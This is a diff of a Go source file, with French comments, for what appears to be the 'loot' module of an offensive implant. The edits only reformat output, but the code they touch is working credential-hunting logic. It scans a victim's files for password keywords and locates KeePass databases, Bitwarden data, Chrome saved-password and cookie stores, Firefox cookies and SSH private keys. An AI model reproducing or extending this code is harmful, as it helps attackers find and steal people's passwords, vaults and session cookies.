@@ -12,8 +12,10 @@ import (
 
 func SearchSensitiveFiles() string {
 	var result strings.Builder
-	result.WriteString("\n💰 LOOT - RECHERCHE DE DONNÉES SENSIBLES\n")
-	result.WriteString("==========================================\n")
+	result.WriteString("\r\n")
+	result.WriteString("==========================================\r\n")
+	result.WriteString("    LOOT - RECHERCHE DE DONNEES SENSIBLES\r\n")
+	result.WriteString("==========================================\r\n")
 
 	// 1. Fichiers sensibles classiques
 	result.WriteString(findSensitiveFiles())
@@ -27,14 +29,15 @@ func SearchSensitiveFiles() string {
 	// 4. Cookies navigateur
 	result.WriteString(GetBrowserCookies())
 
-	result.WriteString("\n✅ Scan terminé\n")
+	result.WriteString("\r\n[+] Scan termine\r\n")
+	result.WriteString("==========================================\r\n")
 	return result.String()
 }
 
 // 1. Chercher des mots de passe dans les fichiers
 func SearchForPasswords() string {
 	var result strings.Builder
-	result.WriteString("\n🔍 Recherche de mots de passe dans les fichiers...\n")
+	result.WriteString("\r\n[*] Recherche de mots de passe dans les fichiers...\r\n")
 
 	extensions := []string{".txt", ".doc", ".docx", ".xls", ".xlsx", ".csv", ".json", ".xml", ".conf", ".config", ".env"}
 	keywords := []string{"password", "mot de passe", "pwd", "pass", "mdp", "credentials", "login"}
@@ -67,7 +70,7 @@ func SearchForPasswords() string {
 
 					for _, keyword := range keywords {
 						if strings.Contains(content, keyword) {
-							result.WriteString(fmt.Sprintf("  ⚠️ Mot de passe potentiel dans: %s\n", path))
+							result.WriteString(fmt.Sprintf("  [!] Mot de passe potentiel: %s\r\n", path))
 							break
 						}
 					}
@@ -84,7 +87,7 @@ func SearchForPasswords() string {
 // 2. Détecter les gestionnaires de mots de passe
 func DetectPasswordManagers() string {
 	var result strings.Builder
-	result.WriteString("\n🔍 Recherche de gestionnaires de mots de passe...\n")
+	result.WriteString("\r\n[*] Recherche de gestionnaires de mots de passe...\r\n")
 
 	// KeePass
 	keepassPaths := []string{
@@ -95,10 +98,10 @@ func DetectPasswordManagers() string {
 
 	for _, path := range keepassPaths {
 		if _, err := os.Stat(path); err == nil {
-			result.WriteString(fmt.Sprintf("  ⚠️ KeePass détecté: %s\n", path))
+			result.WriteString(fmt.Sprintf("  [!] KeePass detecte: %s\r\n", path))
 			filepath.Walk(path, func(p string, info os.FileInfo, err error) error {
 				if err == nil && !info.IsDir() && strings.HasSuffix(p, ".kdbx") {
-					result.WriteString(fmt.Sprintf("    📁 Base KeePass trouvée: %s\n", p))
+					result.WriteString(fmt.Sprintf("    [+] Base KeePass: %s\r\n", p))
 				}
 				return nil
 			})
@@ -113,14 +116,14 @@ func DetectPasswordManagers() string {
 
 	for _, path := range bitwardenPaths {
 		if _, err := os.Stat(path); err == nil {
-			result.WriteString(fmt.Sprintf("  ⚠️ Bitwarden détecté: %s\n", path))
+			result.WriteString(fmt.Sprintf("  [!] Bitwarden detecte: %s\r\n", path))
 		}
 	}
 
 	// Chrome mots de passe
 	chromePath := os.Getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Login Data"
 	if _, err := os.Stat(chromePath); err == nil {
-		result.WriteString("  ⚠️ Mots de passe Chrome détectés\n")
+		result.WriteString("  [!] Mots de passe Chrome detectes\r\n")
 	}
 
 	return result.String()
@@ -129,11 +132,11 @@ func DetectPasswordManagers() string {
 // 3. Chercher les cookies navigateur
 func GetBrowserCookies() string {
 	var result strings.Builder
-	result.WriteString("\n🍪 Recherche de cookies navigateur...\n")
+	result.WriteString("\r\n[*] Recherche de cookies navigateur...\r\n")
 
 	chromeCookies := os.Getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Cookies"
 	if _, err := os.Stat(chromeCookies); err == nil {
-		result.WriteString("  ⚠️ Cookies Chrome trouvés\n")
+		result.WriteString("  [!] Cookies Chrome trouves\r\n")
 	}
 
 	firefoxProfiles := os.Getenv("APPDATA") + "\\Mozilla\\Firefox\\Profiles"
@@ -142,7 +145,7 @@ func GetBrowserCookies() string {
 			if f.IsDir() {
 				cookiesPath := firefoxProfiles + "\\" + f.Name() + "\\cookies.sqlite"
 				if _, err := os.Stat(cookiesPath); err == nil {
-					result.WriteString("  ⚠️ Cookies Firefox trouvés\n")
+					result.WriteString("  [!] Cookies Firefox trouves\r\n")
 					break
 				}
 			}
@@ -154,11 +157,11 @@ func GetBrowserCookies() string {
 
 func findSensitiveFiles() string {
 	var result strings.Builder
-	result.WriteString("\n🔍 Scan pour fichiers sensibles...\n")
+	result.WriteString("\r\n[*] Scan pour fichiers sensibles...\r\n")
 
 	userHome, err := os.UserHomeDir()
 	if err != nil {
-		result.WriteString(fmt.Sprintf("  ❌ Erreur: %v\n", err))
+		result.WriteString(fmt.Sprintf("  [-] Erreur: %v\r\n", err))
 		return result.String()
 	}
 
@@ -178,7 +181,7 @@ func findSensitiveFiles() string {
 			continue
 		}
 
-		result.WriteString(fmt.Sprintf("  📁 Scan: %s\n", path))
+		result.WriteString(fmt.Sprintf("  [>] Scan: %s\r\n", path))
 		files, err := os.ReadDir(path)
 		if err != nil {
 			continue
@@ -192,7 +195,7 @@ func findSensitiveFiles() string {
 			ext := filepath.Ext(file.Name())
 			for _, sensiExt := range extensions {
 				if ext == sensiExt {
-					result.WriteString(fmt.Sprintf("    🔍 Fichier trouvé: %s\n", file.Name()))
+					result.WriteString(fmt.Sprintf("    [+] Fichier trouve: %s\r\n", file.Name()))
 					fichierTrouve++
 					break
 				}
@@ -208,13 +211,13 @@ func findSensitiveFiles() string {
 					file.Name() == "id_dsa" ||
 					file.Name() == "authorized_keys" ||
 					file.Name() == "known_hosts" {
-					result.WriteString(fmt.Sprintf("    🔐 Clé SSH: %s\n", file.Name()))
+					result.WriteString(fmt.Sprintf("    [+] Cle SSH: %s\r\n", file.Name()))
 					fichierTrouve++
 				}
 			}
 		}
 	}
 
-	result.WriteString(fmt.Sprintf("\n📊 Fichiers trouvés: %d\n", fichierTrouve))
+	result.WriteString(fmt.Sprintf("\r\n[*] Fichiers trouves: %d\r\n", fichierTrouve))
 	return result.String()
 }
